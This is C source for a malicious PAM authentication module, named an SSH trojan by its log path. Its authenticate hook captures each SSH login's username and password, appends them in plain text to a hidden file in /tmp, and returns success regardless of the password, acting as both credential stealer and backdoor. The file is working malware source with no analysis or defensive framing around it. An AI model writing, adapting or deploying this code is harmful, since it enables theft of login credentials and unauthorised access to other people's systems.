#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <unistd.h>
#include <time.h>

#define _PATH_LOG "/tmp/.log_sshtrojan1.txt"

/*Return a string that contains current date*/
char* cur_date(){
	char *cur_date_str = malloc(sizeof(char) * 20);
	time_t t = time(NULL);
	struct tm tm = *localtime(&t);
	sprintf(cur_date_str, "%d-%02d-%02d %02d:%02d:%02d", tm.tm_year+1900, tm.tm_mon+1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);	

	return cur_date_str;
}

/*Write to file log with given username and password*/
void send_message(char *username, char *password) {
	FILE *fp;
	char *cur_date_str = cur_date();
	fp = fopen(_PATH_LOG, "a");
	fprintf(fp, "\n[New SSH on %s]\n", cur_date_str);
	fprintf(fp, "Username: %s\n", username);
	fprintf(fp, "Password: %s\n", password);
	fclose(fp);
}

/*Catch username, password*/
PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
	char* username;
	char* password;

	pam_get_item(pamh, PAM_USER, (void *) &username);
	pam_get_item(pamh, PAM_AUTHTOK, (void *) &password);
	send_message(username, password);
	return PAM_SUCCESS;
}
 


